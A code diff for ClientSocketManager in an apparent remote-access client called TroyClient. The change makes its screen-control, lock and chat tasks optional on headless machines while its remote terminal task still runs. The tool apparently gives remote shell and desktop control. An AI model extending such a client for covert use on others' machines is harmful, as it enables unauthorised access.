@@ -34,17 +34,19 @@ public class ClientSocketManager {
 
     private AtomicBoolean running = new AtomicBoolean(true);
     private final TroyClient troyClient;
-    private final Robot bot = new Robot();
+    private final Robot bot = headless ? null : new Robot();
     public final static HashMap<Integer, Integer> extendedKeys = createMap();
 
     private final AtomicReference<ObjectOutputStream> oos = new AtomicReference<>();
     private Socket socket;
     private final ExecutorService threadPool = Executors.newCachedThreadPool();
 
-    private final LockTask lockTask = new LockTask(this, bot);
     private final ClientTerminalTask terminalTask = new ClientTerminalTask(this);
-    private final DesktopTask desktopTask = new DesktopTask(this, bot);
-    private final ClientChatTask chatTask = new ClientChatTask(this);
+    private final LockTask lockTask = headless ? null : new LockTask(this, bot);
+    private final DesktopTask desktopTask = headless ? null : new DesktopTask(this, bot);
+    private final ClientChatTask chatTask = headless ? null : new ClientChatTask(this);
+
+    private static final boolean headless = GraphicsEnvironment.isHeadless();
 
     private final HashMap<FunctionTicket, Object> fixedMap = new HashMap<>();
 
@@ -53,10 +55,12 @@ public class ClientSocketManager {
 
     public ClientSocketManager(TroyClient troyClient) throws AWTException {
         this.troyClient = troyClient;
-        threadPool.execute(lockTask);
+        if (!headless) {
+            threadPool.execute(lockTask);
+            threadPool.execute(desktopTask);
+            threadPool.execute(chatTask);
+        }
         threadPool.execute(terminalTask);
-        threadPool.execute(desktopTask);
-        threadPool.execute(chatTask);
     }
 
     private static HashMap<Integer, Integer> createMap() {
@@ -187,7 +191,7 @@ public class ClientSocketManager {
     }
 
     private Object sendMessage(Object o) {
-        chatTask.addMessage((String)o);
+        chatTask.addMessage((String) o);
         return null;
     }
 
@@ -429,7 +433,7 @@ public class ClientSocketManager {
         JsonReader reader = Json.createReader(new StringReader(response.body().string()));
         JsonObject json = reader.readObject();
 
-        return new NetInfo(inet, json);
+        return new NetInfo(inet, json, headless);
 
     }
 
